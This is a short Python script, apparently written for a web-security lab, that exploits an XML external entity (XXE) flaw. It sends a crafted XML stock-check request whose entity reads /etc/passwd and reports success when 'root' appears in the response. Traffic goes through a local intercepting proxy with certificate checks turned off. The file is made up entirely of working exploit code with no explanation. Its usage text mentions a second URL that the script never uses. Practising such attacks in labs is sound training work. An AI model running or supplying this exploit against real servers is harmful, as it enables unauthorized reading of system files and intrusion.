import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def xxe_exploit(url):
    path = '/product/stock'
    body = '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'''
    r = requests.post(url+path, data=body, verify=False, proxies=proxies)
    if "root" in r.text:
        print("(+) XXE Exploit successful")
    else:
        print("(-) Error Exploiting XXE")

if __name__=='__main__':
    try:
        url = sys.argv[1]
    except IndexError:
        print("Usage: python %s <url> <url>" %sys.argv[0])
        print("Example: python %s example.com exploit.net" %sys.argv[0])
        sys.exit(1)
    xxe_exploit(url)